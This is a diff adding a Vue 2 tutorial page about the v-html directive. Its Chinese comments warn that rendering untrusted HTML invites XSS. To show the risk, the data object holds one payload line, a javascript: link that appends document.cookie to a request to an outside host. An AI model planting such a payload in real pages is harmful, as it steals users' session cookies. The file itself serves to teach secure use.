@@ -1,0 +1,39 @@
+<!-- 
+    v-html:
+        1.作用：向指定节点中渲染包括html结构的内容
+        2.与插值语法的区别：
+            1）v-html会替换掉节点中所有的内容，{{xxx}}则不会
+            2）v-html可以识别html结构
+        3.ps：v-html有安全性问题
+            1）在网站中动态渲染任意html非常危险，容易导致xss攻击
+            2）一定要在可信的内容上使用v-html，不要用在用户提交的内容上
+ -->
+
+ <!DOCTYPE html>
+ <html lang="en">
+ <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-html</title>
+    <script src="./page/vue.js"></script>
+ </head>
+ <body>
+    <div id="root">
+        <div>{{name}}</div>
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+
+    </div>
+    <script type="text/javascript">
+        Vue.config.productionTip = false
+        const vm = new Vue({
+            el:'#root',
+            data:{
+                name:'中国',
+                str:'<h3>hello</h3>',
+                str2:'<a href=javascript:location.href="http://www.baidu.com"+document.cookie>11 </a>'
+            }
+        })
+    </script>
+ </body>
+ </html>
